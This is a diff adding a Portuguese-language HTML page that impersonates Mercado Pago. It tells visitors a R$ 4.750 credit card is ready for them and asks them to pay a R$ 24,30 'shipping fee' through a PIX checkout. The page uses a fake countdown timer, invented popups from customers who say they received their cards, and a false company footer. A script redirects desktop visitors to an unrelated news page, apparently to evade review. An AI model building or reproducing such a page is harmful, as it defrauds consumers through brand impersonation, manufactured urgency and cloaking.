@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>Pagamento do Frete - mercado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: #FFE600;
+            padding: 20px 24px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .container {
+            max-width: 520px;
+            margin: 40px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .limit-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .limit-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 10px;
+        }
+
+        .limit-amount {
+            font-size: 44px;
+            font-weight: 700;
+            color: #00A650;
+            margin-bottom: 30px;
+        }
+
+        .virtual-card {
+            background: linear-gradient(135deg, #3483FA, #2968C8);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 0 auto 40px;
+            color: white;
+            position: relative;
+            overflow: hidden;
+            width: 340px;
+            height: 210px;
+            box-shadow: 0 10px 30px rgba(52, 131, 250, 0.3);
+        }
+
+        .card-chip {
+            width: 45px;
+            height: 35px;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            border-radius: 6px;
+            margin-bottom: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card-chip::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: rgba(0,0,0,0.2);
+            top: 8px;
+        }
+
+        .card-chip::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: rgba(0,0,0,0.2);
+            bottom: 8px;
+        }
+
+        .card-number {
+            font-size: 22px;
+            font-weight: 600;
+            letter-spacing: 3px;
+            margin-bottom: 25px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .card-holder {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .card-label {
+            font-size: 9px;
+            opacity: 0.7;
+            margin-bottom: 3px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .card-name {
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .card-validity {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+
+        .card-date {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .payment-section {
+            margin-bottom: 30px;
+        }
+
+        .section-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 15px;
+        }
+
+        .section-subtitle {
+            font-size: 15px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .price-display {
+            font-size: 40px;
+            font-weight: 700;
+            color: #333333;
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .payment-button {
+            background: #3483FA;
+            color: #FFFFFF;
+            padding: 18px 35px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(52, 131, 250, 0.3);
+            position: relative;
+            overflow: hidden;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .payment-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .payment-button:hover {
+            background: #2968C8;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.4);
+        }
+
+        .payment-button:hover::before {
+            left: 100%;
+        }
+
+        .payment-button:active {
+            transform: translateY(0);
+        }
+
+        .security-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #00A650;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 30px;
+        }
+
+        .shipping-info {
+            margin-bottom: 30px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+
+        .info-label {
+            font-weight: 600;
+            color: #333333;
+        }
+
+        .info-value {
+            color: #666;
+        }
+
+        .timer-alert {
+            background: linear-gradient(135deg, #FFF8E1 0%, #FFECB3 100%);
+            border: 1px solid #FFE082;
+            border-radius: 8px;
+            padding: 14px 18px;
+            margin: 24px 0;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .timer-icon-wrapper {
+            width: 42px;
+            height: 42px;
+            min-width: 42px;
+            background: #FF9800;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+        }
+
+        .timer-content {
+            flex: 1;
+        }
+
+        .timer-display {
+            color: #E65100;
+            font-size: 22px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 2px;
+        }
+
+        .timer-label {
+            font-size: 12px;
+            color: #E65100;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        .timer-text {
+            font-size: 13px;
+            color: #E65100;
+            line-height: 1.4;
+            margin-top: 4px;
+        }
+
+        .faq-section {
+            margin: 40px 0;
+        }
+
+        .faq-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333333;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .faq-item {
+            border-bottom: 1px solid #EDEDED;
+            margin-bottom: 15px;
+        }
+
+        .faq-question {
+            background: none;
+            border: none;
+            width: 100%;
+            text-align: left;
+            padding: 20px 0;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333333;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .faq-question:hover {
+            color: #3483FA;
+        }
+
+        .faq-arrow {
+            font-size: 14px;
+            transition: transform 0.3s ease;
+            color: #3483FA;
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            padding: 0;
+            color: #666;
+            line-height: 1.6;
+            font-size: 14px;
+        }
+
+        .faq-answer.active {
+            max-height: 200px;
+            padding: 0 0 20px 0;
+        }
+
+        .faq-item.active .faq-arrow {
+            transform: rotate(180deg);
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: linear-gradient(135deg, #00A650, #008C44);
+            color: white;
+            padding: 16px 20px;
+            border-radius: 8px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+            display: none;
+            z-index: 1000;
+            max-width: 320px;
+            animation: slideInUp 0.6s ease-out;
+        }
+
+        .notification.show {
+            display: block;
+        }
+
+        .notification-content {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .notification-icon {
+            width: 36px;
+            height: 36px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            animation: pulse 2s infinite;
+            flex-shrink: 0;
+        }
+
+        .notification-text {
+            flex: 1;
+        }
+
+        .notification-name {
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 2px;
+            color: white;
+        }
+
+        .notification-message {
+            font-size: 12px;
+            opacity: 0.9;
+            line-height: 1.3;
+        }
+
+        .notification-time {
+            font-size: 11px;
+            opacity: 0.7;
+            margin-top: 4px;
+        }
+
+        @keyframes slideInUp {
+            from {
+                transform: translateY(100px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
+        @keyframes slideOutDown {
+            from {
+                transform: translateY(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateY(100px);
+                opacity: 0;
+            }
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+
+        .footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: #3483FA;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 500px) {
+            .header {
+                padding: 18px 20px;
+            }
+
+            .logo-container img {
+                height: 40px;
+            }
+
+            .container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+
+            .limit-amount {
+                font-size: 36px;
+            }
+
+            .price-display {
+                font-size: 32px;
+            }
+
+            .virtual-card {
+                width: 100%;
+                max-width: 320px;
+            }
+
+            .card-number {
+                font-size: 20px;
+            }
+
+            .notification {
+                left: 15px;
+                max-width: calc(100% - 30px);
+            }
+        }
+    </style>
+
+    <!-- Pixel Facebook 1 -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel UTMify -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <!-- Pixel Facebook 2 -->
+    <script>
+        window.pixelId = "699511958e254c5ebc775636";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel Google (adicionado sem interferir nos pixels existentes) -->
+    <script>
+        window.googlePixelId = "6a1ecf677f95f02e48c8cff3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script type="text/javascript">
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://mundologistica.com.br/noticias/shopee-amplia-entregas-com-mais-de-2-mil-pontos-de-retirada');
+        }
+    </script>
+</head>
+<body>
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/jS6Z8kTp/logo.png" alt="mercado">
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="limit-section">
+            <div class="limit-title">Seu Limite Disponível</div>
+            <div class="limit-amount">R$ 4.750</div>
+        </div>
+
+        <div class="virtual-card" id="virtualCard">
+            <div class="card-chip"></div>
+            <div class="card-number">4532 •••• •••• ••••</div>
+            <div class="card-details">
+                <div class="card-holder">
+                    <div class="card-label">Titular</div>
+                    <div class="card-name" id="cardName">NOME DO TITULAR</div>
+                </div>
+                <div class="card-validity">
+                    <div class="card-label">Validade</div>
+                    <div class="card-date">12/28</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="payment-section">
+            <h2 class="section-title">Finalize o envio do seu cartão</h2>
+            <p class="section-subtitle">Pague o frete para receber o cartão físico e ativar o cartão virtual agora mesmo.</p>
+
+            <div class="price-display">R$ 24,30</div>
+
+            <button class="payment-button" onclick="processPayment()">Pagar Frete</button>
+
+            <div class="security-info">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="color: #00A650;">
+                    <path d="M18 8H17V6C17 3.24 14.76 1 12 1S7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8ZM12 17C10.9 17 10 16.1 10 15S10.9 13 12 13 14 13.9 14 15 13.1 17 12 17ZM15.1 8H8.9V6C8.9 4.29 10.29 2.9 12 2.9S15.1 4.29 15.1 6V8Z" fill="currentColor"/>
+                </svg>
+                <span>Pagamento 100% seguro</span>
+            </div>
+        </div>
+
+        <div class="shipping-info">
+            <div class="info-row">
+                <span class="info-label">Método de Envio</span>
+                <span class="info-value">PAC</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Prazo de Entrega</span>
+                <span class="info-value">15-20 dias úteis</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Pagamento em Até 10 Minutos</span>
+            </div>
+            <p style="color: #666; font-size: 14px; margin-top: 10px;">
+                Realize o pagamento do frete em até 10 minutos para ativar o cartão virtual.
+            </p>
+            <div class="info-row" style="margin-top: 20px;">
+                <span class="info-label">Ativação Após Pagamento</span>
+            </div>
+            <p style="color: #666; font-size: 14px; margin-top: 10px;">
+                O cartão virtual será ativado automaticamente após a aprovação do pagamento.
+            </p>
+        </div>
+
+        <div class="timer-alert">
+            <div class="timer-icon-wrapper">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z" fill="currentColor"/>
+                </svg>
+            </div>
+            <div class="timer-content">
+                <div class="timer-label">Oferta expira em</div>
+                <div class="timer-display" id="timerDisplay">
+                    <span id="timer">09:58</span>
+                </div>
+                <div class="timer-text">
+                    Pague hoje para garantir seu cartão
+                </div>
+            </div>
+        </div>
+
+        <div class="faq-section">
+            <h3 class="faq-title">Perguntas Frequentes</h3>
+
+            <div class="faq-item">
+                <button class="faq-question" onclick="toggleFaq(this)">
+                    Como funciona o cartão virtual?
+                    <span class="faq-arrow">▼</span>
+                </button>
+                <div class="faq-answer">
+                    O cartão virtual funciona como um cartão físico, mas é disponibilizado imediatamente após o pagamento. Você pode usar para compras online e apps.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question" onclick="toggleFaq(this)">
+                    Por que eu preciso pagar o frete?
+                    <span class="faq-arrow">▼</span>
+                </button>
+                <div class="faq-answer">
+                    O frete é necessário para o envio seguro do seu cartão físico. Este valor cobre os custos de postagem e seguro.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question" onclick="toggleFaq(this)">
+                    O que acontece depois que eu pagar o frete?
+                    <span class="faq-arrow">▼</span>
+                </button>
+                <div class="faq-answer">
+                    Após o pagamento, seu cartão virtual será ativado imediatamente e o cartão físico será enviado para o endereço cadastrado.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question" onclick="toggleFaq(this)">
+                    E se eu pagar o frete e o cartão não chegar?
+                    <span class="faq-arrow">▼</span>
+                </button>
+                <div class="faq-answer">
+                    Todos os envios são rastreados e segurados. Em caso de problema, entre em contato conosco para resolução imediata.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question" onclick="toggleFaq(this)">
+                    E se eu não pagar o frete agora?
+                    <span class="faq-arrow">▼</span>
+                </button>
+                <div class="faq-answer">
+                    Esta oferta é válida apenas hoje. Caso não efetue o pagamento dentro do prazo, o cartão será cancelado.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question" onclick="toggleFaq(this)">
+                    Já paguei o frete. Preciso fazer mais alguma coisa?
+                    <span class="faq-arrow">▼</span>
+                </button>
+                <div class="faq-answer">
+                    Não! Após o pagamento, seu cartão virtual será ativado automaticamente e você receberá todas as informações por email.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="notification" id="notification">
+        <div class="notification-content">
+            <div class="notification-icon">✓</div>
+            <div class="notification-text">
+                <div class="notification-name" id="notificationName">Ana Silva</div>
+                <div class="notification-message" id="notificationMessage">Recebeu seu cartão hoje</div>
+                <div class="notification-time" id="notificationTime">há 2 minutos</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+        <p>CNPJ: 10.573.521/0001-91 · <a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </div>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Debug: Mostrar parâmetros atuais no console
+        console.log('Parâmetros atuais da página de pagamento (PAC):', getUrlParams());
+
+        // =======================================================
+        // SISTEMA DE DADOS DO USUÁRIO
+        // =======================================================
+        
+        const UserData = {
+            userData: {},
+            save: function(dados) {
+                this.userData = { ...this.userData, ...dados };
+                console.log('Dados salvos:', this.userData);
+            },
+            load: function() {
+                const dados = sessionStorage.getItem('user_data');
+                return dados ? JSON.parse(dados) : null;
+            },
+            update: function(novosDados) {
+                this.userData = { ...this.userData, ...novosDados };
+                console.log('Dados atualizados:', this.userData);
+                return this.userData;
+            },
+            clear: function() {
+                this.userData = {};
+            }
+        };
+
+        const colorMappings = {
+            'blue': { gradient: 'linear-gradient(135deg, #3483FA, #2968C8)' },
+            'yellow': { gradient: 'linear-gradient(135deg, #FFE600, #E6CF00)' },
+            'red': { gradient: 'linear-gradient(135deg, #E53935, #C62828)' },
+            'gray': { gradient: 'linear-gradient(135deg, #9E9E9E, #757575)' },
+            'black': { gradient: 'linear-gradient(135deg, #1A1A1A, #000000)' }
+        };
+
+        window.addEventListener('DOMContentLoaded', function() {
+            const dadosUsuario = UserData.load();
+            console.log('Dados carregados:', dadosUsuario);
+            console.log('Parâmetros da URL na inicialização:', getUrlParams());
+
+            if (dadosUsuario) {
+                if (dadosUsuario.nome) {
+                    document.getElementById('cardName').textContent = dadosUsuario.nome.toUpperCase();
+                }
+
+                if (dadosUsuario.cartao_cor && colorMappings[dadosUsuario.cartao_cor]) {
+                    const virtualCard = document.getElementById('virtualCard');
+                    virtualCard.style.background = colorMappings[dadosUsuario.cartao_cor].gradient;
+                }
+            }
+
+            // Verifica se há nome nos parâmetros da URL
+            const urlParams = getUrlParams();
+            if (urlParams.nome) {
+                document.getElementById('cardName').textContent = urlParams.nome.toUpperCase();
+            }
+        });
+
+        let timeLeft = 9 * 60 + 58;
+
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            const display = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+            const timerElement = document.getElementById('timer');
+            if (timerElement) {
+                timerElement.textContent = display;
+            }
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                const timerDisplay = document.getElementById('timerDisplay');
+                if (timerDisplay) {
+                    timerDisplay.innerHTML = '<div class="clock-icon"></div> EXPIRADO';
+                }
+            }
+            timeLeft--;
+        }
+
+        const timerInterval = setInterval(updateTimer, 1000);
+
+        function toggleFaq(button) {
+            const faqItem = button.parentElement;
+            const faqAnswer = button.nextElementSibling;
+
+            document.querySelectorAll('.faq-item').forEach(item => {
+                if (item !== faqItem) {
+                    item.classList.remove('active');
+                    item.querySelector('.faq-answer').classList.remove('active');
+                }
+            });
+
+            faqItem.classList.toggle('active');
+            faqAnswer.classList.toggle('active');
+        }
+
+        function processPayment() {
+            UserData.update({
+                etapa_atual: 'pagamento_frete',
+                pagamento_iniciado: true,
+                pagamento_data: new Date().toISOString(),
+                valor_frete: 24.30,
+                metodo_envio: 'PAC'
+            });
+
+            console.log('Pagamento iniciado:', UserData.load());
+
+            // Captura os parâmetros da URL atual
+            const urlParams = getUrlParams();
+            let checkoutUrl = '15-1.html';
+
+            // Adiciona parâmetros da URL atual
+            let params = new URLSearchParams();
+            Object.keys(urlParams).forEach(key => {
+                params.append(key, urlParams[key]);
+            });
+
+            // Adiciona parâmetro de rastreamento de origem
+            params.append('origem', 'pagamento_frete_pac');
+            params.append('timestamp', Date.now().toString());
+
+            // Constrói URL final
+            if (params.toString()) {
+                checkoutUrl += '?' + params.toString();
+            }
+
+            console.log('URL final do checkout:', checkoutUrl);
+
+            // Redireciona para o checkout PIX
+            window.location.href = checkoutUrl;
+        }
+
+        // Sistema de notificações dinâmicas
+        const notificationData = [
+            {
+                name: "Ana Silva",
+                message: "Recebeu seu cartão hoje",
+                time: "há 2 minutos",
+                icon: "✓"
+            },
+            {
+                name: "Carlos Santos",
+                message: "Ativou o cartão virtual agora",
+                time: "há 5 minutos",
+                icon: "✓"
+            },
+            {
+                name: "Maria Oliveira",
+                message: "Fez primeira compra com o cartão",
+                time: "há 8 minutos",
+                icon: "✓"
+            },
+            {
+                name: "João Pedro",
+                message: "Aprovado com limite de R$ 5.000",
+                time: "há 12 minutos",
+                icon: "✓"
+            },
+            {
+                name: "Patricia Lima",
+                message: "Recebeu cartão em casa hoje",
+                time: "há 15 minutos",
+                icon: "✓"
+            }
+        ];
+
+        let currentNotificationIndex = 0;
+
+        function showNotification() {
+            const notification = document.getElementById('notification');
+            const nameElement = document.getElementById('notificationName');
+            const messageElement = document.getElementById('notificationMessage');
+            const timeElement = document.getElementById('notificationTime');
+            const iconElement = document.querySelector('.notification-icon');
+
+            // Seleciona dados da notificação atual
+            const data = notificationData[currentNotificationIndex];
+            
+            // Atualiza conteúdo
+            nameElement.textContent = data.name;
+            messageElement.textContent = data.message;
+            timeElement.textContent = data.time;
+            iconElement.textContent = data.icon;
+
+            // Mostra notificação
+            notification.classList.add('show');
+            
+            // Esconde após 4 segundos
+            setTimeout(() => {
+                notification.style.animation = 'slideOutDown 0.5s ease-in';
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                    notification.style.animation = 'slideInUp 0.6s ease-out';
+                }, 500);
+            }, 4000);
+
+            // Próxima notificação
+            currentNotificationIndex = (currentNotificationIndex + 1) % notificationData.length;
+        }
+
+        // Primeira notificação após 3 segundos
+        setTimeout(showNotification, 3000);
+
+        // Notificações subsequentes a cada 8 segundos
+        setInterval(showNotification, 8000);
+    </script>
+</body>
+</html>
